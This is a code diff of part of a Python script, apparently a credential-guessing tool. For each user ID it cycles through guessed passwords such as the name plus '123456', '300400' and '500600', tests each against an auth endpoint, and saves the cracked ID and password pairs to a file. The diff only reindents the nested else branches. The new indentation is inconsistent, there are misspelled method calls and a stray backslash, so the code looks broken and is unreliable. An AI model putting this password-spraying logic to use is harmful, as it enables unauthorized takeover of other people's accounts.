@@ -754,7 +754,7 @@ def a_s():
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
                                                     cps.apppend(uid + pass10)
-											    else:
+						else:
                                                     pass11 = name.lower() + '123456'
                                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers=header).text
                                                     q = json.loads(data)
@@ -770,7 +770,7 @@ def a_s():
                                                         cp.write(uid + ' | ' + pass11 + '\n')
                                                         cp.close()
                                                         cps.apppend(uid + pass11)
-												    else:
+						    else:
                                                         pass12 = '300400'
                                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers=header).text
                                                         q = json.loads(data)
@@ -786,7 +786,7 @@ def a_s():
                                                             cp.write(uid + ' | ' + pass12 + '\n')
                                                             cp.close()
                                                             cps.apppend(uid + pass12)
-													    else:
+						        else:
                                                             pass13 = '400500'
                                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers=header).text
                                                             q = json.loads(data)
@@ -802,8 +802,8 @@ def a_s():
                                                                 cp.write(uid + ' | ' + pass13 + '\n')
                                                                 cp.close()
                                                                 cps.apppend(uid + pass13)
-														    else:
-															    pass14 = '500600'
+						            else:
+							        pass14 = '500600'
                                                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass14, headers=header).text
                                                                 q = json.loads(data)
                                                                 if 'loc' in q:
@@ -818,8 +818,8 @@ def a_s():
                                                                     cp.write(uid + ' | ' + pass14 + '\n')
                                                                     cp.close()
                                                                     cps.apppend(uid + pass14)\
-													            else:
-															        pass15 = '800900'
+					                        else:
+				                                    pass15 = '800900'
                                                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers=header).text
                                                                     q = json.loads(data)
                                                                     if 'loc' in q:
